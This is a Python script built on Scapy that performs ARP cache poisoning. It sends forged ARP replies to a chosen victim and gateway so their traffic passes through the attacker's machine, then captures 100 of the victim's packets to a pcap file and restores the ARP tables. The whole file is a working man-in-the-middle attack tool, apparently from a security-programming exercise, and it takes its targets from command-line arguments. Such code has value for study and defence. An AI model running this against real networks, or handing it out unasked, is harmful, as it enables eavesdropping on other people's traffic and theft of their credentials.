from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send,
  sniff, sndrcv, srp, wrpcap)

import os
import sys
import time

def get_mac(target_ip):
  packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=target_ip)
  resp, _ = srp(packet, timeout=2, retry=10,verbose=False)
  for _, r in resp:
    return r[Ether].src
  return None 

class Arper:
  def __init__(self, victim, gateway, interface='wlp3s0'):
    self.victim = victim
    self.victim_mac = get_mac(victim)
    self.gateway = gateway
    self.gateway_mac = get_mac(gateway)
    self.interface = interface
    conf.iface = interface
    conf.verb = 0
    print(f'Initialized {interface}')
    print(f'Gateway ({gateway}) is at {self.gateway_mac}')
    print(f'Victim ({victim}) is at {self.victim_mac}')
    print(30*'-')
  def run(self):
    self.posion_thread = Process(target = self.posion)
    self.posion_thread.start()

    self.sniff_thread = Process(target = self.sniff)
    self.sniff_thread.start()

  def posion(self):
    posion_victim = ARP()
    posion_victim.op = 2
    posion_victim.psrc = self.gateway
    posion_victim.pdst = self.victim
    posion_victim.hwdst = self.victim_mac
    print(f'ip src:{posion_victim.psrc}')
    print(f'ip dst:{posion_victim.pdst}')
    print(f'mac dst:{posion_victim.hwdst}')
    print(f'mac src:{posion_victim.hwsrc}')
    print(posion_victim.summary())
    print('-'*30)

    posion_gateway = ARP()
    posion_gateway.op = 2
    posion_gateway.psrc = self.victim
    posion_gateway.pdst = self.gateway
    posion_gateway.hwdst = self.gateway_mac
    print(f'ip src:{posion_gateway.psrc}')
    print(f'ip dst:{posion_gateway.pdst}')
    print(f'mac dst:{posion_gateway.hwdst}')
    print(f'mac src:{posion_gateway.hwsrc}')
    print(posion_gateway.summary())
    print('-'*30)
        
    print(f'Beginning the ARP posion. [CTRL-C to stop]')
    while True:
      sys.stdout.write('.')
      sys.stdout.flush()
      try:
        send(posion_victim)
        send(posion_gateway)
      except KeyboardInterrupt:
        self.restore()
        sys.exit()
      else:
        time.sleep(2)

  def sniff(self, count=100):
    time.sleep(5)
    print(f'Sniffing {count} packets')
    bpf_filter = 'ip host %s ' % self.victim
    packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
    wrpcap('arper.pcap', packets)
    print('Got the packets')
    self.restore()
    self.posion_thread.terminate()
    print('Finished')

  def restore(self):
    print('Restoring ARP tables')
    send(ARP(
        op = 2,
        psrc = self.gateway,
        hwsrc = self.gateway_mac,
        pdst = self.victim,
        hwdst = 'ff:ff:ff:ff:ff:ff',
        count = 5
      ))
    send(ARP(
        op = 2,
        psrc = self.victim,
        hwsrc = self.victim_mac,
        pdst = self.gateway,
        hwdst = 'ff:ff:ff:ff:ff:ff',
        count = 5
      ))
if __name__ == '__main__':
  (victim, gateway, interface) = (sys.argv[1],sys.argv[2],sys.argv[3])
  myarp = Arper(victim, gateway, interface)
  myarp.run()
